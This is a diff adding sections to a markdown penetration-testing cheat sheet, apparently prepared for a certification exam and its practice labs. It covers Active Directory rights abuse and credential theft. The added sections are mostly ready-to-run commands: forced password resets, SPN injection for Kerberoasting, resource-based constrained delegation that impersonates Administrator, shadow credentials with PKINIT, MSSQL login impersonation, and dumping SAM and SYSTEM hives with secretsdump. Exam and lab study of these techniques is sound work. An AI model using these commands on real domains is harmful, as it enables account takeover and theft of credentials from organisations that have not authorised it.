@@ -2,13 +2,15 @@
 
 ## 🚀 Quick Navigation (Master Index)
 - [#smbenum] - SMB Enumeration & Recursive Harvest
-- [#ftpenum] - FTP Enumeration & Recursive Harvest
+- [#usernamediscovery] - Administrator Discovery & User Enumeration (RID/LDAP/SQLi)
 - [#sqlimastery] - SQL Injection (All DBs) & Manual Escapes
 - [#mssqlmastery] - MSSQL RCE (xp_cmdshell), sqlcmd, & Impersonation
 - [#adattacks] - Kerberoasting, AS-REP Roasting, RBCD [Nagoya/Poseidon/Medtech]
 - [#privesc] - Linux & Windows Privilege Escalation
 - [#revshells] - Reverse Shell Cheat Sheet (The "Tak Tak Tak")
 - [#hydrabruteforce] - Service Brute Forcing
+- [#privilegedrights] - Privileged Rights Abuse (GenericAll/Write/DACL)
+- [#hokkaido] - Hokkaido & Advanced AD Tactics (ShadowCreds/WSUS)
 
 ---
 
@@ -1957,6 +1959,72 @@ Critical for fixing older exploits during the exam.
 ---
 
 **Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
+
+---
+
+## 4. Privileged Rights Abuse [#privilegedrights]
+When you have specific rights (GenericAll, GenericWrite, WriteDacl, etc.) over another object.
+
+### GenericAll / GenericWrite on User
+- **Action**: Change password or add SPN.
+- **RPC Password Reset (ForceChangePassword)**:
+  - `rpcclient -U "DOMAIN/user%password" [IP] -c "setuserinfo2 target_user 23 'NewPassword123!'"`
+  - *Note*: Level 23 reset is the most reliable for ForceChangePassword rights.
+- **bloodyAD Password Reset**:
+  - `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [IP] set password [TARGET] 'NewPassword123!'`
+- **Set SPN for Kerberoasting (GenericWrite)**:
+  - `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [IP] set object [TARGET] servicePrincipalName -v 'MSSQLSvc/fake.domain.local'`
+  - **PowerShell**: `Set-ADUser [TARGET] -ServicePrincipalNames @{Add='MSSQLSvc/fake.domain.local'}`
+
+### GenericWrite on Computer (RBCD)
+- **1. Add Computer**: `impacket-addcomputer [DOMAIN]/[USER]:[PASS] -computer-name 'FOO$' -computer-pass 'Bar123!'`
+- **2. Add RBCD**: `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [IP] add rbcd '[TARGET]$'' 'FOO$'`
+- **3. Get ST**: `impacket-getST -dc-ip [IP] -spn 'cifs/TARGET' -impersonate Administrator 'DOMAIN/FOO$:Bar123!'`
+
+---
+
+## 5. Hokkaido & Advanced AD Tactics [#hokkaido]
+Tactics derived from the Hokkaido lab and advanced AD environments.
+
+### Shadow Credentials (msDS-KeyCredentialLink) [#shadowcreds]
+Used when you have `GenericWrite`/`GenericAll` over a user/computer but cannot reset their password or set an SPN.
+
+- **1. Generate Shadow Credentials**:
+  ```bash
+  bloodyAD --host [DC_IP] -d [DOMAIN] -u [USER] -p [PASS] add shadowCredentials [TARGET_USER]
+  ```
+- **2. Obtain TGT (PKINIT)**:
+  Use the generated `.pem` and `.priv` files with `gettgtpkinit.py`.
+  ```bash
+  python3 gettgtpkinit.py -cert-pem cert.pem -key-pem priv.pem [DOMAIN]/[TARGET_USER] [OUT_CCACHE]
+  ```
+- **3. targetedKerberoast (Alternative)**:
+  ```bash
+  python3 targetedKerberoast.py -v -d [DOMAIN] -u [USER] -p [PASS] --dc-ip [DC_IP] --request-user [TARGET_USER]
+  ```
+  - *Result*: Automatically adds SPN, requests ticket, then removes SPN.
+
+### Localized Service Discovery & Impersonation
+- **WSUS Share Discovery**:
+  - `netexec smb [IP] -u [USER] -p [PASS] --shares`
+  - Look for: `UpdateServicesPackages`, `WsusContent`, `WSUSTemp`.
+- **MSSQL Impersonation (Hokkaido Style)**:
+  - **Check Impersonation Rights**: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
+  - **Execute as Login**: `EXECUTE AS LOGIN = 'target_user';`
+- **Backup Operators Access (Bypass ACLs)**:
+  ```powershell
+  # Save hives despite lack of direct filesystem access
+  reg save hklm\sam C:\Temp\sam
+  reg save hklm\system C:\Temp\system
+  # Local dumping
+  impacket-secretsdump -sam sam -system system LOCAL
+  ```
+
+### Advanced Username Extraction
+- **LDAP Group Enumeration**:
+  - `netexec ldap [IP] -u [USER] -p [PASS] --groups "IT"`
+- **ldapsearch for sAMAccountName**:
+  - `ldapsearch -x -H ldap://[IP] -D "user@domain.com" -w 'pass' -b "dc=domain,dc=com" "(cn=*PartName*)" sAMAccountName cn`
 
 ---
 
